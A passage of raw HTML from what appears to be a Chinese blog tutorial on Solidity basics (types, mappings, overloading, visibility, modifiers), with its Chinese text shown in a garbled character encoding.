class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token comment">//è®¾å®šåŠŸèƒ½</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">changeName</span><span class="token punctuation">(</span><span class="token builtin">string</span> _newName<span class="token punctuation">)</span> <span class="token keyword">public</span>    <span class="token punctuation">&#123;</span>        name<span class="token operator">=</span>_newName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šå°±æ˜¯ä¸€ä¸ªéå¸¸åŸºç¡€çš„Solidityåˆçº¦äº†ï¼Œå¯ä»¥çœ‹çš„å‡ºåˆçº¦å¾ˆåƒæ˜¯æˆ‘ä»¬åœ¨åˆ«çš„è¯­è¨€ä¸­çš„ä¸€ä¸ªç±»ï¼Œç¡®å®å¦‚æ­¤ï¼Œæ‰€ä»¥ä¸€äº›é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å†…å®¹ä¹Ÿå¯ä»¥å¥—ç”¨åˆ°Solidityä¸Š</p><p>åœ¨Solidityä¸­ï¼Œè®¸å¤šçš„æ“ä½œéƒ½éœ€è¦èŠ±è´¹èµ„æºï¼Œåˆågasï¼Œä¹Ÿå°±æ˜¯è™šæ‹Ÿè´§å¸ï¼Œè¿™äº›å†…å®¹å°†åœ¨åé¢è®²åˆ°</p><p>åœ¨ç»™å±æ€§å¢åŠ publicå±æ€§ä¹‹åè‡ªåŠ¨ç”Ÿæˆgetæ–¹æ³•</p><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><ul><li>int</li><li>uint=ä¸€ä¸ª256ä½é•¿åº¦çš„æ— ç¬¦å·int</li><li>bytes1â€¦â€¦bytes32 ä¸€ä¸ªbyteç±»å‹æ˜¯8ä½</li></ul><h3 id="å…³é”®å­—"><a href="#å…³é”®å­—" class="headerlink" title="å…³é”®å­—"></a>å…³é”®å­—</h3><ul><li>public</li><li>view</li><li>pure</li><li>returns</li><li>return</li><li>payableå…³é”®å­—ä¿®é¥°å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°ç»™æˆ‘ä»¬çš„åˆçº¦åœ°å€å……å€¼</li></ul><p>å›æ»šå‡½æ•°ï¼ˆfallbackï¼‰</p><h3 id="å…¨å±€å±æ€§"><a href="#å…¨å±€å±æ€§" class="headerlink" title="å…¨å±€å±æ€§"></a>å…¨å±€å±æ€§</h3><ul><li><code>block.blockhash(uint blockNumber) returns (bytes32)</code>ï¼šæŒ‡å®šåŒºå—çš„åŒºå—å“ˆå¸Œâ€”â€”ä»…å¯ç”¨äºæœ€æ–°çš„ 256 ä¸ªåŒºå—ä¸”ä¸åŒ…æ‹¬å½“å‰åŒºå—ï¼›è€Œ blocks ä» 0.4.22 ç‰ˆæœ¬å¼€å§‹å·²ç»ä¸æ¨èä½¿ç”¨ï¼Œç”± <code>blockhash(uint blockNumber)</code> ä»£æ›¿</li><li><code>block.coinbase</code> (<code>address</code>): æŒ–å‡ºå½“å‰åŒºå—çš„çŸ¿å·¥åœ°å€</li><li><code>block.difficulty</code> (<code>uint</code>): å½“å‰åŒºå—éš¾åº¦</li><li><code>block.gaslimit</code> (<code>uint</code>): å½“å‰åŒºå— gas é™é¢</li><li><code>block.number</code> (<code>uint</code>): å½“å‰åŒºå—å·</li><li><code>block.timestamp</code> (<code>uint</code>): è‡ª unix epoch èµ·å§‹å½“å‰åŒºå—ä»¥ç§’è®¡çš„æ—¶é—´æˆ³</li><li><code>gasleft() returns (uint256)</code>ï¼šå‰©ä½™çš„ gas</li><li><code>msg.data</code> (<code>bytes</code>): å®Œæ•´çš„ calldata</li><li><code>msg.gas</code> (<code>uint</code>): å‰©ä½™ gas - è‡ª 0.4.21 ç‰ˆæœ¬å¼€å§‹å·²ç»ä¸æ¨èä½¿ç”¨ï¼Œç”± <code>gesleft()</code> ä»£æ›¿</li><li><code>msg.sender</code> (<code>address</code>): æ¶ˆæ¯å‘é€è€…ï¼ˆå½“å‰è°ƒç”¨ï¼‰</li><li><code>msg.sig</code> (<code>bytes4</code>): calldata çš„å‰ 4 å­—èŠ‚ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°æ ‡è¯†ç¬¦ï¼‰</li><li><code>msg.value</code> (<code>uint</code>): éšæ¶ˆæ¯å‘é€çš„ wei çš„æ•°é‡</li><li><code>now</code> (<code>uint</code>): ç›®å‰åŒºå—æ—¶é—´æˆ³ï¼ˆ<code>block.timestamp</code>ï¼‰</li><li><code>tx.gasprice</code> (<code>uint</code>): äº¤æ˜“çš„ gas ä»·æ ¼</li><li><code>tx.origin</code> (<code>address</code>): äº¤æ˜“å‘èµ·è€…ï¼ˆå®Œå…¨çš„è°ƒç”¨é“¾ï¼‰</li></ul><h3 id="addressæˆå‘˜å˜é‡"><a href="#addressæˆå‘˜å˜é‡" class="headerlink" title="addressæˆå‘˜å˜é‡"></a>addressæˆå‘˜å˜é‡</h3><ul><li><p><code>&lt;address&gt;.balance</code> (<code>uint256</code>):</p><p>ä»¥ Wei ä¸ºå•ä½çš„ <a href="https://solidity-cn.readthedocs.io/zh/develop/types.html#address">åœ°å€ç±»å‹</a> çš„ä½™é¢ã€‚</p></li><li><p><code>&lt;address&gt;.transfer(uint256 amount)</code>:</p><p>å‘ <a href="https://solidity-cn.readthedocs.io/zh/develop/types.html#address">åœ°å€ç±»å‹</a> å‘é€æ•°é‡ä¸º amount çš„ Weiï¼Œå¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œå‘é€ 2300 gas çš„çŸ¿å·¥è´¹ï¼Œä¸å¯è°ƒèŠ‚ã€‚</p></li><li><p><code>&lt;address&gt;.send(uint256 amount) returns (bool)</code>:</p><p>å‘ <a href="https://solidity-cn.readthedocs.io/zh/develop/types.html#address">åœ°å€ç±»å‹</a> å‘é€æ•°é‡ä¸º amount çš„ Weiï¼Œå¤±è´¥æ—¶è¿”å› <code>false</code>ï¼Œå‘é€ 2300 gas çš„çŸ¿å·¥è´¹ç”¨ï¼Œä¸å¯è°ƒèŠ‚ã€‚</p></li><li><p><code>&lt;address&gt;.call(...) returns (bool)</code>:</p><p>å‘å‡ºä½çº§å‡½æ•° <code>CALL</code>ï¼Œå¤±è´¥æ—¶è¿”å› <code>false</code>ï¼Œå‘é€æ‰€æœ‰å¯ç”¨ gasï¼Œå¯è°ƒèŠ‚ã€‚</p></li><li><p><code>&lt;address&gt;.callcode(...) returns (bool)</code>ï¼š</p><p>å‘å‡ºä½çº§å‡½æ•° <code>CALLCODE</code>ï¼Œå¤±è´¥æ—¶è¿”å› <code>false</code>ï¼Œå‘é€æ‰€æœ‰å¯ç”¨ gasï¼Œå¯è°ƒèŠ‚ã€‚</p></li><li><p><code>&lt;address&gt;.delegatecall(...) returns (bool)</code>:</p><p>å‘å‡ºä½çº§å‡½æ•° <code>DELEGATECALL</code>ï¼Œå¤±è´¥æ—¶è¿”å› <code>false</code>ï¼Œå‘é€æ‰€æœ‰å¯ç”¨ gasï¼Œå¯è°ƒèŠ‚ã€‚</p></li></ul><h3 id="mappingå“ˆå¸Œè¡¨"><a href="#mappingå“ˆå¸Œè¡¨" class="headerlink" title="mappingå“ˆå¸Œè¡¨"></a>mappingå“ˆå¸Œè¡¨</h3><p>ä½¿ç”¨è¯­æ³•</p><p><code>mapping(æ˜ å°„å…³ç³») å“ˆå¸Œè¡¨åç§°;</code></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span><span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">mappingTest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> idmap<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint</span> <span class="token operator">=></span> <span class="token builtin">string</span><span class="token punctuation">)</span> namemap<span class="token punctuation">;</span>    <span class="token builtin">uint</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token builtin">string</span> username<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> account<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        sum<span class="token operator">++</span><span class="token punctuation">:</span>        idmap<span class="token punctuation">[</span>account<span class="token punctuation">]</span><span class="token operator">=</span>sum<span class="token punctuation">;</span>        namemap<span class="token punctuation">[</span>sum<span class="token punctuation">]</span><span class="token operator">=</span>username<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°é‡è½½"><a href="#å‡½æ•°é‡è½½" class="headerlink" title="å‡½æ•°é‡è½½"></a>å‡½æ•°é‡è½½</h3><p>å½“ä½¿ç”¨ä¸åŒçš„å‚æ•°ï¼ˆæ•°é‡ï¼Œç±»å‹ï¼‰æ—¶å¯ä»¥è®©å‡½æ•°é‡è½½ï¼Œå¹¶ä¸”å¦‚åŒuint160ä¸addressè¿™æ ·çš„å‚æ•°ç±»å‹ä¹Ÿæ˜¯ç®—ä¸åŒå‚æ•°ç±»å‹ï¼Œå¯ä»¥ç¼–è¯‘é€šè¿‡ï¼Œä½†ä¼šæœ‰é—®é¢˜</p><p>å½“ä½¿ç”¨ç¡®å®šå‚æ•°è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœèƒ½åŒæ—¶åŒ¹é…å¤šä¸ªé‡è½½çš„å‡½æ•°ï¼Œä¼šç›´æ¥æŠ¥é”™ï¼Œå¦‚ä¸‹ä¾‹ï¼š<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140247208.png"></p><p>åœ¨è¿™é‡Œtestå‡½æ•°è°ƒç”¨funå‡½æ•°æ—¶ä¼ å…¥äº†ä¸€ä¸ªç¡®å®šçš„å‚æ•°1ï¼ŒåŒæ—¶åŒ¹é…äº†uintç±»å‹å’Œuint8ç±»å‹ï¼Œæ­¤æ—¶å¯¼è‡´ç¼–è¯‘å¤±è´¥</p><p>è€Œåœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¼ å…¥çš„æ˜¯<code>msg.sender</code>ï¼Œæ­¤æ—¶ç¼–è¯‘é€šè¿‡ï¼Œè¿è¡Œå‘ç°ç»“æœè¿”å›è°ƒç”¨äº†ä»¥addressä¸ºå‚æ•°ç±»å‹çš„funå‡½æ•°é‡è½½ï¼Œ<del>ä¸ºå•¥å•Šæˆ‘ä¹Ÿä¸çŸ¥é“å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Š</del>ï¼Œåé¢å†çœ‹å§ğŸ˜­<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140250890.png"></p><h3 id="å‡½æ•°ä¼ å‚"><a href="#å‡½æ•°ä¼ å‚" class="headerlink" title="å‡½æ•°ä¼ å‚"></a>å‡½æ•°ä¼ å‚</h3><p>ç±»ä¼¼pythonçš„ä¸¤ç§æ–¹æ³•ï¼Œä¸€æ˜¯æŒ‰ç…§å‡½æ•°å®šä¹‰çš„é¡ºåºç›´æ¥å¡«å…¥ï¼ŒäºŒæ˜¯é€šè¿‡èŠ±æ‹¬å·æŒ‡å®šä¼ å…¥å“ªä¸ªå½¢å‚ï¼Œå¦‚ä¸‹ä¾‹ï¼š</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">parma</span><span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> num<span class="token punctuation">;</span>    <span class="token builtin">string</span> <span class="token keyword">public</span> name<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setParam</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _num<span class="token punctuation">,</span><span class="token builtin">string</span> _name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        num<span class="token operator">=</span>_num<span class="token punctuation">;</span>        name<span class="token operator">=</span>_name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">T1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">setParam</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token string">"J1an"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">T2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">setParam</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>_name<span class="token punctuation">:</span><span class="token string">"Ben"</span><span class="token punctuation">,</span>_num<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//    function T3()&#123;</span><span class="token comment">//        setParam(100);</span><span class="token comment">//    &#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼ŒT1ï¼ŒT2å½¢è±¡çš„è¯´æ˜äº†å‡½æ•°ä¼ å‚çš„æ–¹å¼ï¼Œå¹¶ä¸”å¦‚æœåŠ å…¥T3å‡½æ•°ä»£ç ä¼šå‘ç°ç¼–è¯‘æ— æ³•é€šè¿‡ï¼Œè¿™æ˜¯å› ä¸ºåœ¨åˆçº¦å†…éƒ¨çš„å‡½æ•°è°ƒç”¨å…¶ä»–å‡½æ•°æ—¶å¿…é¡»ä¸¥æ ¼æŒ‰ç…§å‡½æ•°å®šä¹‰çš„å½¢å‚ä¼ å…¥å‚æ•°ï¼Œä½†æˆ‘ä»¬åœ¨å°è¯•è®©ç”¨æˆ·ç›´æ¥å¯¹<code>setParam(100)</code>è¿›è¡Œè°ƒç”¨æ—¶ä¼šå‘ç°è°ƒç”¨æˆåŠŸäº†ï¼Œå¹¶ä¸”<code>_name</code>è¢«è‡ªåŠ¨èµ‹å€¼ä¸ºç©ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<del>tmdè¿™ç§ç¿æ™ºå‚æ•°ä¼ é€’å¤šå°‘æœ‰ç‚¹å¤§ç—…</del><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140302099.png"></p><h3 id="å‡½æ•°è¿”å›å€¼"><a href="#å‡½æ•°è¿”å›å€¼" class="headerlink" title="å‡½æ•°è¿”å›å€¼"></a>å‡½æ•°è¿”å›å€¼</h3><p>solidityä¸­çš„å‡½æ•°å¯ä»¥æœ‰å¤šä¸ªè¿”å›å€¼</p><p>å¦‚æœç»™äº†å‡½æ•°è¿”å›å€¼çš„å‚æ•°åï¼Œé‚£ä¹ˆè¿™ä¸ªå‚æ•°ä¼šä»¥ç±»ä¼¼å½¢å‚çš„æ–¹å¼ä¼ å…¥åˆ°å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸é€šè¿‡returnè€Œç›´æ¥ç»™è¿™ä¸ªå½¢å‚èµ‹å€¼æ¥è¾¾åˆ°è¿”å›å€¼çš„æ•ˆæœï¼Œè€Œå¦‚æœå½¢å‚ä¼ é€’å’ŒreturnåŒæ—¶å­˜åœ¨ï¼Œä»¥returnä¸ºå‡†ï¼Œ<del>è¿™ä¸åºŸè¯å—è‚¯å®šreturnä¼˜å…ˆçº§é«˜å•Šï¼Œreturnç›¸å½“äºèµ‹å€¼äº†è¿˜æŠŠå‡½æ•°ç»™ç»“æŸäº†ï¼Œåé¢æ²¡æ“ä½œäº†å¯ä¸å®ƒé«˜å—</del></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">funReturn</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">T1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">T2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        num<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">T3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        num<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å˜é‡ä½œç”¨åŸŸå’Œå€¼ä¼ é€’"><a href="#å˜é‡ä½œç”¨åŸŸå’Œå€¼ä¼ é€’" class="headerlink" title="å˜é‡ä½œç”¨åŸŸå’Œå€¼ä¼ é€’"></a>å˜é‡ä½œç”¨åŸŸå’Œå€¼ä¼ é€’</h3><p>ä½œç”¨åŸŸä»¥å°çš„ä¸ºå‡†</p><h3 id="ä¿®é¥°ç¬¦"><a href="#ä¿®é¥°ç¬¦" class="headerlink" title="ä¿®é¥°ç¬¦"></a>ä¿®é¥°ç¬¦</h3><p><code>private</code>å‡½æ•°åªèƒ½è¢«åˆçº¦ç‹¬ç«‹ä½¿ç”¨ï¼Œä¸èƒ½è¢«ç»§æ‰¿</p><p><code>public</code>å‡½æ•°å¯ä»¥è¢«ä»»æ„è°ƒç”¨ï¼Œå¯ä»¥è¢«ç»§æ‰¿</p><p><code>internal</code>å‡½æ•°åªèƒ½åœ¨åˆçº¦å†…éƒ¨è°ƒç”¨ï¼Œä¸èƒ½ç›´æ¥åœ¨å¤–éƒ¨è°ƒç”¨ï¼Œå¯ä»¥è¢«ç»§æ‰¿</p><p><code>external</code>å‡½æ•°ä¸èƒ½åœ¨åˆçº¦å†…éƒ¨è¿›è¡Œè°ƒç”¨ï¼Œåªèƒ½åœ¨åˆçº¦å¤–éƒ¨è¢«è°ƒç”¨ï¼ˆåœ¨å‡½æ•°å†…éƒ¨å¯ä»¥é€šè¿‡thisæ¥é—´æ¥è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥é€šè¿‡newåˆ›å»ºæ–°åˆçº¦çš„æ–¹æ³•è°ƒç”¨ï¼‰ï¼Œå¯ä»¥è¢«ç»§æ‰¿</p><p><code>pure</code>ä¸æ¶ˆè€—gasï¼Œä¸ä¼šè¯»å–å…¨å±€å˜é‡ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹å…¨å±€å˜é‡ï¼Œä¸€ä¸ªå›ºå®šè¾“å…¥å°±ä¼šæœ‰å›ºå®šè¾“å‡º</p><p><code>view</code>è¯»å–å…¨å±€å˜é‡ä½†ä¸ä¿®æ”¹ï¼Œä¸æ¶ˆè€—gas</p><p><code>payable</code>è¿›è¡Œé‡‘é’±äº¤æ˜“æ—¶æ‰€å¿…é¡»çš„ä¿®é¥°ç¬¦</p><h3 id="å€¼ä¼ é€’å’Œå‰¯æœ¬æ‹·è´"><a href="#å€¼ä¼ é€’å’Œå‰¯æœ¬æ‹·è´" class="headerlink" title="å€¼ä¼ é€’å’Œå‰¯æœ¬æ‹·è´"></a>å€¼ä¼ é€’å’Œå‰¯æœ¬æ‹·è´</h3><p>ç›´æ¥å¦‚åŒa=bè¿™æ ·çš„ä¼ é€’éƒ½æ˜¯å€¼ä¼ é€’ï¼Œä¼ å…¥å‡½æ•°éƒ½æ˜¯å‰¯æœ¬æ‹·è´</p><h3 id="constå¸¸é‡å®šä¹‰ï¼ˆå·²åºŸå¼ƒï¼‰"><a href="#constå¸¸é‡å®šä¹‰ï¼ˆå·²åºŸå¼ƒï¼‰" class="headerlink" title="constå¸¸é‡å®šä¹‰ï¼ˆå·²åºŸå¼ƒï¼‰"></a>constå¸¸é‡å®šä¹‰ï¼ˆå·²åºŸå¼ƒï¼‰</h3><p>å‡½æ•°ä¸­ä½¿ç”¨constantï¼ˆç‰ˆæœ¬ä¸º0.4.16ï¼‰ä¿®é¥°ï¼Œä¸æ¶ˆè€—gasï¼ˆä¸viewä¿®é¥°ç­‰ä»·ï¼Œå¹¶ä¸”å°†åœ¨0.5.0ç‰ˆæœ¬ä¸­åºŸå¼ƒï¼‰</p><p>å¯¹äºå…¨å±€å˜é‡ï¼ˆå±€éƒ¨ä¸å¯ç”¨ï¼‰ä½¿ç”¨constantä¿®é¥°ï¼Œæ— æ³•è¢«æ›´æ”¹ï¼ˆå°±æ˜¯å¸¸é‡å®šä¹‰å˜›ï½ï½ï½ï¼‰</p><p>å˜é‡å¹¶éæ‰€æœ‰ç±»å‹éƒ½å¯ä»¥ä½¿ç”¨å¸¸é‡æ˜¾ç¤ºï¼Œå¯ä½¿ç”¨çš„ç±»å‹æœ‰<code>int,uint,string,bytes1-32</code></p><h3 id="æ„é€ å‡½æ•°"><a href="#æ„é€ å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h3><p>æ„é€ å‡½æ•°ä¸åˆçº¦åŒåæˆ–è€…å‘½åä¸º<code>constructor</code>ï¼ˆæ–°ç‰ˆæœ¬ï¼‰ï¼Œé¦–å…ˆè¢«æ‰§è¡Œï¼Œæ„é€ å‡½æ•°ä¼ å‚éœ€è¦åœ¨åˆçº¦éƒ¨ç½²æ—¶èµ‹äºˆ</p><h3 id="å‡½æ•°modifireï¼ˆå‡½æ•°ä¿®æ”¹å™¨ï¼‰"><a href="#å‡½æ•°modifireï¼ˆå‡½æ•°ä¿®æ”¹å™¨ï¼‰" class="headerlink" title="å‡½æ•°modifireï¼ˆå‡½æ•°ä¿®æ”¹å™¨ï¼‰"></a>å‡½æ•°modifireï¼ˆå‡½æ•°ä¿®æ”¹å™¨ï¼‰</h3><p>requireåˆ¤æ–­ï¼Œå¦‚æœrequireä¸­çš„å†…å®¹ä¸æˆç«‹ï¼Œé‚£ä¹ˆåé¢çš„ä»£ç éƒ½ä¸ä¼šè¢«æ‰§è¡Œå¹¶ä¸”å›æ»š</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208220048145.png"></p><p>æ­¤å¤„ä¾‹å­ä¸­ï¼Œåœ¨åˆçº¦éƒ¨ç½²æ—¶è®¾å®šäº†éƒ¨ç½²è€…ä¸ºåˆçº¦æ‹¥æœ‰è€…ï¼Œåœ¨modifierä¸­éªŒè¯äº†å‡½æ•°changeçš„èº«ä»½ï¼Œé¦–æ¬¡æˆ‘ä»¬è®©å‡½æ•°æ‹¥æœ‰è€…5B3è¿›è¡Œè°ƒç”¨å‘ç”µå‡½æ•°è°ƒç”¨æˆåŠŸï¼Œaçš„å€¼è¢«ä¿®æ”¹ï¼Œè€Œå½“æˆ‘ä»¬åˆ‡æ¢ç”¨æˆ·Ab8å†è¿›è¡Œè°ƒç”¨æ—¶ï¼Œä¼šå‘ç°è°ƒç”¨å¤±è´¥å¹¶ä¸”æŠ¥é”™</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">modifierTest</span><span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> a<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">modifierTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        owner<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">modifier</span> OnlyOwner<span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token operator">==</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _num<span class="token punctuation">)</span>OnlyOwner<span class="token punctuation">&#123;</span>        a<span class="token operator">=</span>_num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> modifierName<span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>æ‰§è¡Œå‡½æ•°è¦æ±‚æ¡ä»¶<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span><span class="token comment">//å ä½å‡½æ•°</span><span class="token punctuation">&#125;</span><span class="token comment">//å‡½æ•°è°ƒç”¨</span><span class="token keyword">function</span> <span class="token function">funName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> modifierName<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//è¯¥å‡½æ•°æ‰§è¡Œæ—¶ä¼šå…ˆè¿›å…¥modifierè¿›è¡Œåˆ¤æ–­</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬äºŒä¸ªåº”ç”¨ï¼Œåˆ¤æ–­ç”¨æˆ·æ³¨å†Œ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208220923409.png"></p><p>è¿™ä¸ªä¾‹å­ä¸­æˆ‘ä»¬åœ¨æ³¨å†Œå‰å…ˆå¯¹å…¶è¦æ±‚è¯¥addresså¯¹åº”çš„idä¸º0ä¹Ÿå°±æ˜¯æœªæ³¨å†Œè¿‡æ‰å¯ä»¥è¿›å…¥æ³¨å†Œå‡½æ•°</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">modifierTest</span><span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token operator">=></span><span class="token builtin">uint</span><span class="token punctuation">)</span> idmap<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token operator">=></span><span class="token builtin">string</span><span class="token punctuation">)</span> namemap<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">modifierTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        owner<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">modifier</span> OnlyOwner<span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token operator">==</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">modifier</span> regConfirm<span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>idmap<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span 